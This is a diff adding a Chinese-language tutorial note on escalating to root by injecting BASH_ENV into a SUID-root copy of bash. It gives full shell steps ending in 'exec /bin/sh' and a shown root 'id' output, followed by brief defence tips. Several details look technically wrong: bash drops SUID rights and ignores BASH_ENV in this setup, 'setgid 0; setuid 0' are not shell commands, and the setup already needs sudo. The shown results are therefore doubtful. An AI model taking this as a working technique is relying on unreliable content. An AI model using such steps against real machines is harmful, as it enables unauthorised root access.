@@ -1,0 +1,92 @@
+不常用（
+
+## 一、原理
+
+1. **SUID 脚本**
+
+   * 单纯对脚本（`.sh`）打 SUID 位，现代 Linux 通常会被内核忽略，但如果你能控制解释器（二进制）的 SUID 属性，就能间接让脚本“提权”执行。
+2. **非交互式 Bash 读取 BASH\_ENV**
+
+   * 当 Bash 以非交互式方式启动时（如执行脚本），它会在执行脚本前，检查环境变量 `BASH_ENV`，如果存在就先读取并执行其内容。
+3. **利用条件**
+
+   * 攻击者能在执行前设置 `BASH_ENV`；
+   * 目标解释器二进制（如 bash）带有 SUID 并且可写或可替换；
+   * 系统没有在启动解释器时清空关键环境。
+
+---
+
+## 二、完整示例
+
+假设我们在一台测试机上，普通用户有权在 `/tmp` 下复制文件并给它打 SUID。
+
+### 1. 准备 SUID 解释器
+
+```bash
+# 复制系统 bash
+cp /bin/bash /tmp/bash_suid
+# 让它属于 root 并打上 SUID
+sudo chown root:root /tmp/bash_suid
+sudo chmod 4755   /tmp/bash_suid
+# 验证
+ls -l /tmp/bash_suid
+# -rwsr-xr-x 1 root root ... /tmp/bash_suid
+```
+
+此时，任何用户执行 `/tmp/bash_suid script.sh`，都会以 root 身份运行脚本。
+
+### 2. 编写示例脚本
+
+```bash
+cat > /tmp/vuln_script.sh << 'EOF'
+#!/tmp/bash_suid
+echo "[*] 脚本内 UID = $(id -u), GID = $(id -g)"
+# 正常脚本逻辑
+EOF
+chmod 755 /tmp/vuln_script.sh
+```
+
+单纯跑脚本，会看到 root 的 UID：
+
+```bash
+$ /tmp/vuln_script.sh
+[*] 脚本内 UID = 0, GID = 0
+```
+
+### 3. 利用 BASH\_ENV 注入
+
+1. **在 `/tmp` 下写一个环境脚本**
+
+   ```bash
+   cat > /tmp/env.sh << 'EOF'
+   #!/bin/bash
+   # 这段会在脚本执行前跑
+   setgid 0; setuid 0    # 切换 real UID/GID
+   exec /bin/sh          # 跳到一个交互 shell
+   EOF
+   chmod +x /tmp/env.sh
+   ```
+2. **设置环境变量**
+
+   ```bash
+   export BASH_ENV=/tmp/env.sh
+   ```
+3. **执行目标脚本**
+
+   ```bash
+   $ /tmp/vuln_script.sh
+   # 你会直接进入一个 root shell
+   # id
+   uid=0(root) gid=0(root) groups=0(root)
+   ```
+
+之所以能成功，是因为 `/tmp/bash_suid` 是 SUID root 的 Bash，按非交互式方式执行脚本时，会先载入并执行 `BASH_ENV` 指定的 `/tmp/env.sh`，其中的 `exec /bin/sh` 就把你带进了一个 root shell。
+
+---
+
+## 三、防御建议
+
+1. **禁止或限制 SUID 解释器**：避免给解释器（bash、perl、python 等）打 SUID。
+2. **清理环境**：在程序启动早期调用 `clearenv()` 或手动 `unset BASH_ENV`、`unset ENV`。
+3. **使用绝对路径与安全选项**：对不可控脚本，用 `bash --noprofile --norc`，并在 sudoers 里显式清理环境。
+4. **启用安全框架**：SELinux/AppArmor 可以进一步限制可读取的环境变量。
